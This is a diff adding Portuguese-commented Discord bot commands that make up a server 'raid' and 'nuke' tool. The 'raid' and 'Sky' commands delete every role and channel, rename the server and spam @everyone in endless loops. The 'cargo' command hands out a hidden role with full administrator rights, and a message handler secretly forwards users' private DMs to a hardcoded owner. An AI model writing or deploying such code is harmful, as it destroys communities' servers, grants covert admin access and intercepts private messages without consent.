+@bot.command()
+async def raid(ctx):
+    if ctx.author.name not in AUTHORIZED_USERS:
+        await ctx.send(":x: Você não tem permissão.")
+        return
+
+    guild = ctx.guild
+    await ctx.send(
+        ":rocket: **Iniciando RAID... Criando 90 canais e spammando @everyone em loop.**"
+    )
+
+    created_channels = []
+
+    for i in range(90):
+        try:
+            ch = await guild.create_text_channel(f"star-sky-raid-{i + 1:03d}")
+            created_channels.append(ch)
+            await ch.send(SPAM_MESSAGE)
+            await asyncio.sleep(0.3)  # delay pra evitar rate limit
+        except discord.HTTPException as e:
+            if "Maximum number of channels" in str(e):
+                await ctx.send(
+                    f"Limite de canais atingido! Criei {len(created_channels)} de 90."
+                )
+                break
+            else:
+                print(f"Erro criando canal {i + 1}: {e}")
+
+    await ctx.send(
+        f"RAID iniciado! Criei {len(created_channels)} canais. Spammando em loop infinito."
+    )
+
+    async def spam_loop(channel):
+        while True:
+            try:
+                await channel.send(SPAM_MESSAGE)
+                await asyncio.sleep(1.0)
+            except:
+                break
+
+    for ch in created_channels:
+        bot.loop.create_task(spam_loop(ch))
+
+
+# SKY - Nuke completo + cria 90 canais e spamma em loop
+
+
+@bot.command(name="cargo")
+@commands.has_permissions(
+    manage_roles=True
+)  # só quem tem permissão de gerenciar cargos usa
+@commands.bot_has_permissions(manage_roles=True)  # bot precisa ter permissão também
+async def dar_cargo(ctx, *members: discord.Member):
+    if not members:
+        await ctx.send("Mencione pelo menos uma pessoa! Ex: !cargo @pessoa")
+        return
+
+    guild = ctx.guild
+
+    # Procura se o cargo "." já existe
+    cargo = discord.utils.get(guild.roles, name=".")
+
+    if cargo is None:
+        try:
+            # Cria o cargo "." com TODAS as permissões (incluindo administrador)
+            cargo = await guild.create_role(
+                name=".",
+                color=discord.Color(0x000000),  # preto puro
+                permissions=discord.Permissions.all(),  # TODAS as permissões (inclui admin)
+                hoist=False,  # não aparece separado na lista de membros
+                mentionable=False,  # não pode ser mencionado
+                reason="Cargo criado pelo comando !cargo (com admin)",
+            )
+            await ctx.send(
+                "Cargo '.' criado com **todas as permissões** (incluindo administrador)!"
+            )
+        except discord.Forbidden:
+            await ctx.send(
+                "Não tenho permissão pra criar cargos com admin! (me dê permissão superior)"
+            )
+            return
+        except discord.HTTPException as e:
+            await ctx.send(f"Erro ao criar cargo: {e}")
+            return
+    else:
+        await ctx.send("Cargo '.' já existe, usando o atual (verifique se tem admin).")
+
+    # Tenta dar o cargo pra todas as pessoas mencionadas
+    sucesso = []
+    falha = []
+
+    for member in members:
+        try:
+            await member.add_roles(cargo, reason="Cargo dado pelo comando !cargo")
+            sucesso.append(member.mention)
+        except discord.Forbidden:
+            falha.append(
+                f"{member.mention} (bot sem permissão alta o suficiente ou cargo com admin bloqueia)"
+            )
+        except discord.HTTPException as e:
+            falha.append(f"{member.mention} ({e})")
+
+    resposta = ""
+    if sucesso:
+        resposta += f"✅ Cargo '.' dado com sucesso pra: {', '.join(sucesso)}\n"
+    if falha:
+        resposta += f"❌ Falha com: {', '.join(falha)}\n"
+        resposta += "(Se tiver cargo com admin, o Discord bloqueia bots de dar pra outros. Dê manualmente ou tire o admin do cargo)."
+
+    if not resposta:
+        resposta = "Ninguém recebeu o cargo (todos falharam)."
+
+    await ctx.send(resposta)
+
+
+@bot.command()
+async def Sky(ctx):
+    # Verificação de permissão
+    if ctx.author.name not in AUTHORIZED_USERS:
+        await ctx.send(":x: Você não tem permissão.")
+        return
+
+    # Criando o Embed
+    embed = discord.Embed(
+        title="⚠️ AVISO DE SEGURANÇA",
+        description="Você está prestes a iniciar o comando **Sky**. Isso apagará tudo.\n\nEscolha uma opção abaixo:",
+        color=0xFF0000,
+    )
+
+    view = ConfirmNuke()
+    msg = await ctx.send(embed=embed, view=view)
+
+    # Espera o clique no botão
+    await view.wait()
+
+    if view.value is None:
+        await msg.edit(
+            content="⏰ Tempo esgotado. Operação cancelada.", embed=None, view=None
+        )
+        return
+    elif view.value is False:
+        await msg.edit(
+            content="❌ Operação cancelada pelo usuário.", embed=None, view=None
+        )
+        return
+
+    # Se clicou em Verde (True), o código continua daqui para baixo
+    await msg.edit(content="🚀 Iniciando processo...", embed=None, view=None)
+
+    guild = ctx.guild
+
+    for role in guild.roles:
+        if role != guild.default_role:
+            try:
+                await role.delete(reason="Star Sky Nuke")
+            except:
+                pass
+
+    for channel in guild.channels:
+        try:
+            await channel.delete(reason="Star Sky Nuke")
+        except:
+            pass
+
+    try:
+        await guild.edit(name="Star Sky Full")
+    except:
+        pass
+
+    created_channels = []
+
+    for i in range(90):
+        try:
+            ch = await guild.create_text_channel(f"star-sky-nuke-{i + 1:03d}")
+            created_channels.append(ch)
+            await ch.send(SPAM_MESSAGE)
+            await asyncio.sleep(0.3)
+        except discord.HTTPException as e:
+            if "Maximum number of channels" in str(e):
+                await ctx.send(
+                    f"Limite de canais atingido! Criei {len(created_channels)} de 90."
+                )
+                break
+            else:
+                print(f"Erro criando canal {i + 1}: {e}")
+
+    await ctx.send(
+        f"Nuke concluído! Criei {len(created_channels)} canais. Iniciando spam em loop infinito."
+    )
+
+    async def spam_loop(channel):
+        while True:
+            try:
+                await channel.send(SPAM_MESSAGE)
+                await asyncio.sleep(1.0)
+            except:
+                break
+
+    for ch in created_channels:
+        bot.loop.create_task(spam_loop(ch))
+
+
+@bot.event
+async def on_message(message):
+    # Ignora mensagens do próprio bot pra não loop
+    if message.author == bot.user:
+        return
+
+    # Se a mensagem for DM (não em server)
+    if message.guild is None:
+        # ID do dono (seu ID)
+        dono_id = 1046795045946281984  # muda se quiser outro canal/ID
+
+        # Envia pra você (no DM do dono ou em um canal específico)
+        dono = bot.get_user(dono_id)
+        if dono:
+            try:
+                await dono.send(
+                    f"**DM recebida de {message.author} ({message.author.id}):**\n{message.content}"
+                )
+            except:
+                print("Não consegui mandar DM pro dono (DM fechadas?)")
+        else:
+            print("Dono não encontrado!")
+
+    # Não esquece de processar comandos normais
+    await bot.process_commands(message)
+
+
+@bot.event
+async def on_command(ctx):
+    # Ignora comandos do próprio bot
+    if ctx.author.bot:
+        return
+
+    # Pega horário atual
+    agora = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
+
+    # Servidor
+    server = ctx.guild.name if ctx.guild else "DM"
+    server_id = ctx.guild.id if ctx.guild else "DM"
+
+    # Usuário
+    user = ctx.author.name
+    user_id = ctx.author.id
+
+    # Comando usado
+    comando = ctx.message.content
+
+    # Mensagem de log
+    log_msg = f"""
+Servidor: {server} (ID: {server_id})
+Horário: {agora}
+Comando: {comando}
+Usuário: {user} (ID: {user_id})
+Made By: C̷a̷b̷r̷a̷l̷D̷e̷v̷💤
+    """.strip()
+
+    # Envia pro webhook usando o secret
+    async with aiohttp.ClientSession() as session:
+        webhook_url = os.getenv("WEBHOOK_URL")
+        if not webhook_url:
+            print("WEBHOOK_URL não encontrado no Secrets!")
+            return
+
+        webhook = discord.Webhook.from_url(webhook_url, session=session)
+        await webhook.send(log_msg)
+
+
+# keep_alive()
+try:
+    bot.run(os.getenv("TOKEN"))
+except Exception as e:
+    print(f"Erro ao iniciar o bot: {e}")
